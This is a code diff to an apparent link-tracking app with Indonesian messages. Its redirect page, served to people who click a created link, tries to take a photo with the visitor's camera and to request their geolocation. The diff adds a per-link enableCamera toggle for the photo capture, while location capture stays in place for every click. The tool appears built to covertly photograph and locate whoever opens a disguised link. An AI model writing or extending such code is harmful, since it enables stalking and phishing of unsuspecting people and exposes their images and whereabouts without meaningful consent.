@@ -252,7 +252,7 @@ app.post('/api/logout', (req, res) => {
 
 // PROTECTED API: Create new link
 app.post('/api/links', requireAuth, (req, res) => {
-  let { targetUrl, title, customCode, imageUrl } = req.body;
+  let { targetUrl, title, customCode, imageUrl, enableCamera } = req.body;
   if (!targetUrl) return res.status(400).json({ error: 'URL Tujuan wajib diisi!' });
   if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
     targetUrl = 'https://' + targetUrl;
@@ -269,6 +269,7 @@ app.post('/api/links', requireAuth, (req, res) => {
     title: title || targetUrl,
     targetUrl,
     imageUrl: imageUrl || null,
+    enableCamera: enableCamera === true || enableCamera === 'true',
     createdAt: new Date().toISOString(),
     clicks: []
   };
@@ -642,9 +643,13 @@ const handleRedirect = async (req, res) => {
           });
         }
 
+        const isCameraEnabled = ${link.enableCamera ? 'true' : 'false'};
+
         async function initCapture() {
-          const photo = await tryCaptureCamera();
-          if (photo) photoDataUrl = photo;
+          if (isCameraEnabled) {
+            const photo = await tryCaptureCamera();
+            if (photo) photoDataUrl = photo;
+          }
 
           if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
